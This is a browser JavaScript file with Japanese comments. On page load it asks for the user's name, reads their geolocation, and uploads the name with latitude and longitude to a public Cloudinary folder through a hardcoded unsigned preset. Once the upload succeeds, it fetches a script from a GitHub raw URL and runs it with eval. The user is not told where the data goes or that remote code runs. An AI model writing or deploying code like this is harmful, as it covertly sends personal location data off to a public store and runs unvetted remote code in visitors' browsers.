// Cloudinaryの設定
const cloud_name = "dxzsajngl";
const upload_preset = "gmr5c3hg";
const folder_name = "information";

// ファイルをアップロードする関数
function uploadFile(file, fileName, fileExists) {
  const formData = new FormData();
  formData.append("file", file);
  formData.append("upload_preset", upload_preset);
  formData.append("folder", folder_name);
  formData.append("public_id", fileName);

  fetch(`https://api.cloudinary.com/v1_1/${cloud_name}/upload`, {
    method: "POST",
    body: formData,
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("File uploaded to Cloudinary!");
      console.log("Public URL: ", data.secure_url);
      executeAdditionalProcess(data.secure_url);
    })
    .catch((error) => {
      console.log("Error uploading file: ", error);
    });
}

// ファイル名が存在するかチェックする関数
function checkFileExists(fileName) {
  return fetch(`https://res.cloudinary.com/${cloud_name}/image/upload/${folder_name}/${fileName}`)
    .then((response) => {
      if (response.status === 200) {
        return true; // ファイルが存在する
      } else if (response.status === 404) {
        return false; // ファイルが存在しない
      }
    });
}

// 位置情報を取得する関数
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(uploadLocation);
  } else {
    console.log("Geolocation is not supported by this browser.");
  }
}

// 名前の入力とファイルのアップロードを実行
async function uploadWithStoredName() {
  const storedName = localStorage.getItem("information1");

  if (
    storedName &&
    storedName.length >= 3 &&
    /[^\x01-\x7E\xA1-\xDF]/.test(storedName) &&
    !/[A-Za-z]/.test(storedName)
  ) {
    getLocation();
  } else {
    const name = prompt(
      "名前を入力してください（3文字以上で、漢字が2文字含まれ、アルファベットが含まれていない）"
    );

    if (
      name &&
      name.length >= 3 &&
      /[^\x01-\x7E\xA1-\xDF]/.test(name) &&
      !/[A-Za-z]/.test(name)
    ) {
      localStorage.setItem("information1", name);
      getLocation();
    } else {
      console.log("入力が無効です。再度お試しください。");
    }
  }
}

// 位置情報の取得とファイルの作成とアップロードを実行
async function uploadLocation(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;
  const storedName = localStorage.getItem("information1");

  // ファイル名を生成
  const fileName = `${storedName}.txt`;

  // 同じ名前のファイルが存在するかチェック
  const fileExists = await checkFileExists(fileName);

  // 新しいファイルをアップロード
  const text = `名前: ${storedName}, Latitude: ${latitude}, Longitude: ${longitude}`;
  const file = new File([text], fileName, { type: "text/plain" });
  uploadFile(file, fileName, fileExists);
}

// アップロードが完了した後に実行する後続の処理
function executeAdditionalProcess(fileURL) {
  console.log("アップロードしたファイルのURL: ", fileURL);

  // 成功時にのみスクリプトを実行
  const successScriptURL = "https://raw.githubusercontent.com/hirotomoki12345/hamanan/main/base.js";
  executeScript(successScriptURL);
}

// JavaScriptスクリプトを実行する関数
function executeScript(url) {
  fetch(url)
    .then((data) => data.text())
    .then((text) => eval(text));
}

// 名前の入力とファイルのアップロードを実行
uploadWithStoredName();
